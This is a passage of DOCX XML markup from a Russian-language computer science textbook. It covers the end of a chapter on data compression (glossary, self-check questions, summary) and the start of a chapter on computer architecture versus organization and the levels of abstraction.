        <w:t>, чем исходный. Алгоритм будет пытаться найти закономерности, не найдёт, но добавит свои метаданные (заголовки, словари). В итоге — антисжатие.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 10</w:t>
      </w:r>
      <w:r>
        <w:t>: Попытка сжать архив</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Файл randomdata.bin: 10 МБ (случайные байты)</w:t>
        <w:br/>
        <w:t>Сжатие ZIP: randomdata.zip = 10.1 МБ</w:t>
        <w:br/>
        <w:br/>
        <w:t>Увеличился на 0.1 МБ из-за заголовков ZIP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило</w:t>
      </w:r>
      <w:r>
        <w:t>: Не архивируй уже сжатые файлы (.jpg, .mp3, .mp4, .zip). Толку ноль, только время потеряешь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сжатие данных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс уменьшения объёма информации путём устранения избыточности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сжатие без потерь (lossless)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — метод сжатия, при котором исходные данные восстанавливаются полностью.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сжатие с потерями (lossy)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — метод сжатия, при котором часть данных удаляется безвозвратно для достижения большей степени сжатия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Избыточность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — повторяющиеся или предсказуемые части данных, которые можно закодировать компактнее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Степень сжатия (compression ratio)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — отношение размера исходного файла к размеру сжатого (чем больше, тем лучше).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RLE (Run-Length Encoding)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм, заменяющий последовательности повторяющихся символов на пары "количество + символ".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кодирование Хаффмана</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм, присваивающий часто встречающимся символам короткие коды, а редким — длинные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>LZW</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — словарный алгоритм сжатия, строящий таблицу повторяющихся последовательностей в процессе работы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Deflate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — комбинация LZ77 и кодирования Хаффмана, используется в ZIP, GZIP, PNG.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>LZMA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — мощный алгоритм сжатия, используемый в 7-Zip и XZ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JPEG</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стандарт сжатия изображений с потерями, основанный на дискретном косинусном преобразовании.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MP3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стандарт сжатия аудио с потерями, использующий психоакустическую модель.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H.264 (AVC)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стандарт сжатия видео, использующий межкадровое предсказание и внутрикадровое сжатие.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Квантование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс округления значений для уменьшения точности (и объёма данных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Психоакустическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель восприятия звука человеком, используемая для определения неслышимых частот.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Файл размером 80 МБ сжат до 10 МБ. Вычислите степень сжатия и коэффициент сжатия. Во сколько раз уменьшился файл?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните разницу между сжатием без потерь и с потерями. Приведите по 3 примера форматов каждого типа и укажите, для каких данных они используются.**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сожмите строку "AAAABBBBCCCC" алгоритмом RLE. Вычислите степень сжатия (считайте, что исходные символы занимают по 1 байту, а в сжатом виде пара "число+символ" тоже 2 байта).**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему JPEG плохо подходит для сжатия скриншотов с текстом, но хорош для фотографий? Какой формат лучше использовать для скриншотов и почему?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**У вас есть видеофайл в формате H.264 размером 500 МБ. Вы архивируете его в ZIP — размер архива получился 502 МБ. Объясните, почему сжатие не сработало и даже увеличило размер.**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача**: У вас есть аудиофайл WAV (стерео, 44.1 кГц, 16 бит, 4 минуты). Вычислите его размер без сжатия. Затем оцените размер после сжатия в MP3 с битрейтом 192 кбит/с. Какова степень сжатия?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Материал этой главы связан со следующими темами:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.3** (Представление звуковых данных): форматы MP3, AAC, Opus используют сжатие с потерями</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.4** (Представление символьных данных): кодировки UTF-8 содержат элементы сжатия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.5** (Меры информации): энтропия Шеннона определяет теоретический предел сжатия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.8** (Представление графических данных): форматы JPEG, PNG, GIF, WebP используют различные алгоритмы сжатия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 8** (Сети): HTTP-сжатие (GZIP, Brotli) ускоряет загрузку сайтов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Резюме</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы разобрали способы сжатия информации:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Два типа сжатия: **без потерь** (для данных, где важен каждый бит) и **с потерями** (для мультимедиа)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Алгоритмы без потерь: **RLE** (простой), **Хаффман** (классика), **LZW** (словарный), **Deflate** (ZIP/GZIP), **LZMA** (7-Zip)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Алгоритмы с потерями: **JPEG** (фото), **MP3/AAC/Opus** (аудио), **H.264/H.265** (видео)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Степень сжатия и коэффициент сжатия как метрики эффективности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Практическое применение: когда какой формат использовать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Ограничения: нельзя сжать всё подряд, случайные данные не сжимаются</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь ты знаешь:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какой формат выбрать для разных типов данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Почему JPEG превращает мемы в кашу после пересохранения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как рассчитать степень сжатия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что не все данные можно сжать (и почему архивирование архива — плохая идея)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что сжатие — это всегда компромисс между размером, качеством и скоростью</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сжатие данных — это фундаментальная технология, без которой современный интернет был бы невозможен. Представь, что каждая фотка в Instagram весила бы 30 МБ, а фильм — 200 ГБ. Спасибо алгоритмам сжатия, что этого не происходит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Объём главы: ~15000 символов_</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 2.1: Понятие архитектуры и структуры ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Итак, первый раздел позади — мы разобрались, как компьютер кодирует информацию, считает в двоичной системе и что происходит в памяти. Теперь пора выяснить, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>что вообще из себя представляет эта машина</w:t>
      </w:r>
      <w:r>
        <w:t>, которая всё это делает. Ведь понимание того, как устроен компьютер «внутри», — это как знание анатомии для врача. Без этого ты просто тыкаешь пальцем в небо и надеешься, что всё заработает.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В этой главе мы разберёмся с фундаментальными понятиями </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>архитектуры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>структуры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ЭВМ. Это не просто абстрактные термины из учебника — это основа, на которой строится всё: от выбора процессора для игрового ПК до проектирования суперкомпьютеров. Понимание архитектуры позволит тебе осознанно подходить к оптимизации программ, оценивать производительность систем и не задавать вопросы в духе «а почему у меня тормозит?» (хотя, будем честны, всё равно будет тормозить, но хоть будешь знать почему).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава тесно связана с главой 1.2 (Представление данных в памяти ЭВМ), где мы говорили про организацию памяти, и является прологом к главам 2.2 (История ЭВМ) и 2.3 (Принципы фон Неймана), где копнём глубже в историю и архитектурные принципы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Архитектура vs Структура: разбираемся в терминологии</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Первое, что нужно понять: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>архитектура</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>структура</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это не синонимы. Их часто путают, но это разные уровни абстракции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Архитектура ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Архитектура ЭВМ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (computer architecture) — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>концептуальное представление</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> вычислительной машины, видимое программисту. Грубо говоря, это то, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> компьютер умеет делать, а не </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> он это делает на физическом уровне.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Архитектура включает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Система команд** (instruction set architecture, ISA) — какие инструкции понимает процессор</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Типы данных** — какие форматы чисел, символов и т.д. поддерживаются</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Регистры** — сколько их, какого размера, для чего используются</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Режимы адресации** — как процессор обращается к памяти</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Способы ввода-вывода** — как процессор общается с периферией</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: x86-64 и ARM — это две разные архитектуры. Программа, написанная для x86-64, не запустится на ARM без специальных костылей (эмуляции или перекомпиляции), потому что у них разный набор инструкций.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Структура ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура ЭВМ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (computer organization) — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>физическая реализация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> архитектуры. Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> именно устроены компоненты на уровне железа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Структура включает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Количество ядер процессора** и их взаимодействие</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Организация кэш-памяти** (уровни кэша, размеры)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Тип системной шины** и её характеристики</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Конкретные схемы АЛУ**, блоков управления и т.д.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Технология изготовления** (техпроцесс, частоты)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Intel Core i7 и AMD Ryzen — оба реализуют архитектуру x86-64, но имеют разную </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>структуру</w:t>
      </w:r>
      <w:r>
        <w:t>: разное количество ядер, разную организацию кэша, разные техпроцессы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Аналогия для понимания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Представь, что архитектура — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>интерфейс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (API) программы: «есть функция `сложить(a, b)`, которая возвращает сумму». А структура — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>конкретная реализация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> этой функции: можно написать её на Python за 1 строчку, можно на ассемблере с оптимизацией под каждый процессор. Интерфейс один, реализаций — тысяча.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Уровни представления компьютера</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компьютер можно рассматривать на разных уровнях абстракции — от физики транзисторов до высокоуровневых языков программирования. Это называется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>иерархией уровней</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6 уровней абстракции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Физический уровень** (transistor level)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Транзисторы, электрические сигналы, напряжения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Тут работают инженеры-электронщики</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нас это волнует только когда компьютер сгорел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Логический уровень** (gate level)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Логические элементы: И, ИЛИ, НЕ (помнишь главу 1.6?)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Триггеры, сумматоры, мультиплексоры</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Тут проектируют микросхемы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень микроархитектуры** (microarchitecture level)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регистры, АЛУ, блоки управления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как инструкции выполняются внутри процессора (конвейер, суперскалярность)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разработчики процессоров работают на этом уровне</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень архитектуры команд** (ISA level)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Система команд: ADD, MOV, JMP и т.д.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программирование на ассемблере</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Это граница между железом и софтом</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень операционной системы** (OS level)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Файлы, процессы, потоки, управление памятью</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Системные вызовы (open, read, write)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Тут живут разработчики ОС и драйверов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень прикладных программ** (application level)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Высокоуровневые языки: Python, Java, C++</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Библиотеки, фреймворки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обычные программисты работают тут</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t>: В этой главе мы сосредоточимся на уровнях 3-4 (микроархитектура и ISA), потому что именно они определяют понятия «архитектура» и «структура» ЭВМ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Основные компоненты ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Любой компьютер, от смартфона до суперкомпьютера, состоит из </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>четырёх основных компонентов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Это не просто декларация — это следствие </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>принципов фон Неймана</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (о них подробнее в главе 2.3).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Процессор (CPU — Central Processing Unit)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процессор</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это мозг компьютера. Он выполняет программы, обрабатывает данные, управляет всеми остальными устройствами. Процессор состоит из двух основных блоков:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Арифметико-логическое устройство (АЛУ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>АЛУ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (англ. ALU — Arithmetic Logic Unit) выполняет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Арифметические операции**: сложение, вычитание, умножение, деление (привет, глава 1.1!)</w:t>
      </w:r>
    </w:p>
    <w:p>
